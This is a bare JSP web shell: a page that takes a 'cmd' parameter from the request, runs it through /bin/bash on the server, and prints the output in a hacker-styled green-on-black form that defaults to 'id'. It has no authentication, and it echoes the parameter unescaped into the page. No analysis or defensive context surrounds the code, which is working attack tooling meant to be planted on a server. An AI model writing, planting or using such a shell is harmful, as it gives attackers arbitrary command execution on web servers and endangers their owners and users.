<%@ page import="java.io.*" %>
<html>
<body style="background:#111;color:#0f0;font-family:monospace;">
<pre>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while((line = br.readLine()) != null) {
                out.println(line);
            }
            br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while((line = br.readLine()) != null) {
                out.println("[ERR] " + line);
            }
        } catch(Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
%>
</pre>
<form method="GET">
    <input type="text" name="cmd" value="<%= request.getParameter("cmd")!=null?request.getParameter("cmd"):"id" %>" style="width:70%;background:#222;color:#0f0;border:1px solid #0f0;padding:8px;">
    <button type="submit" style="background:#0f0;color:black;padding:8px 15px;border:none;">Run</button>
</form>
</body>
</html>